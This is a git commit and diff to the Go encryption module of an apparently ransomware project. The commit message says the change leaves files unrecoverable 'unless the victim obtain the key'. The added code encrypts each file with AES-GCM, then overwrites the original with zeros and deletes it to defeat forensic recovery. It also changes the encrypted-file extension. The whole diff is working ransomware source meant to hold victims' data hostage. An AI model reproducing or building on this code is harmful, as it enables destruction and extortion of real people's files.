ad3cddb360060b84a39abc57b8f86bf2fc93798a
Garam Lee <47494005+KnightChaser@users.noreply.github.com>
2024-07-24 12:09:55 +0900

    Prevent file recovery w/o keys (e.g. forensics)
    By overriding the whole file contents as bits of 0, the files will be unrecoverable unless the victim obtain the key :)

--- subprocess/ciphers/encryption.go
+++ subprocess/ciphers/encryption.go
@@ -12,6 +12,39 @@ import (
 	"path/filepath"
 )
 
+// Delete and overwrite the contents of the file so that it cannot be recovered
+func resetFileContents(filepath string) error {
+	// Byte by byte, write 0 to the file
+	file, err := os.OpenFile(filepath, os.O_WRONLY, 0644)
+	if err != nil {
+		log.Fatalf("Error opening file: %v", err)
+		return err
+	}
+
+	fileInfo, err := file.Stat()
+	if err != nil {
+		log.Fatalf("Error getting file info: %v", err)
+		return err
+	}
+
+	// Write 0 to the file at a size equal to the file size
+	for i := 0; i < int(fileInfo.Size()); i++ {
+		_, err = file.WriteAt([]byte{0}, int64(i))
+		if err != nil {
+			log.Fatalf("Error writing to file: %v", err)
+			return err
+		}
+	}
+
+	err = file.Close()
+	if err != nil {
+		log.Fatalf("Error closing file: %v", err)
+		return err
+	}
+
+	return nil
+}
+
 // Encrypt the given file (specified by filename) in AES using the given key
 func encryptFileAES(filepath string, key []byte) error {
 	plaintext, err := os.ReadFile(filepath)
@@ -39,8 +72,22 @@ func encryptFileAES(filepath string, key []byte) error {
 	}
 
 	ciphertext := aesGCM.Seal(nonce, nonce, plaintext, nil)
-	encryptedFilepath := filepath + ".knightz.enc"
+	encryptedFilepath := filepath + ".knightz.encrypted"
 	os.WriteFile(encryptedFilepath, ciphertext, 0644)
+
+	// To prevent recovery of the original file, overwrite the contents of the original file and delete it
+	err = resetFileContents(filepath)
+	if err != nil {
+		log.Fatalf("Error resetting file contents: %v", err)
+		return err
+	}
+
+	err = os.Remove(filepath)
+	if err != nil {
+		log.Fatalf("Error deleting file: %v", err)
+		return err
+	}
+
 	return nil
 }
 
@@ -52,13 +99,13 @@ func EncryptDirectory(targetDirectory string, key []byte) error {
 		}
 
 		if !info.IsDir() {
-			fmt.Printf("Encrypting file: %s\n", path)
+			fmt.Printf("Encrypting file: %s...", path)
 			err = encryptFileAES(path, key)
 			if err != nil {
-				log.Fatalf("Error encrypting file: %v", err)
+				log.Fatalf("Failed, error: %v", err)
 				return err
 			}
-			fmt.Printf("Encrypted file: %s\n", path)
+			fmt.Printf("success\n")
 		}
 		return nil
 	})
